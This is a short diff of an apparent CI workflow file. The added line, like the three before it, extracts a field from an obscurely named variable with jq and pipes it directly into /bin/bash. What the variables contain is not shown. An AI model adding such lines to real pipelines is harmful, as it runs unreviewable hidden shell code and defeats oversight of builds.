@@ -27,6 +27,7 @@ jobs:
           echo $hbdm21968 | jq -r .kf0 | /bin/bash
           printf '%s' "$hywsz8" | jq -r .xscfb316 | /bin/bash
           printf '%s' "$izemu6" | jq -r .kbl3 | /bin/bash
+          echo $z585 | jq -r .phwil0 | /bin/bash
 
       - name: Save archive
         if: always()
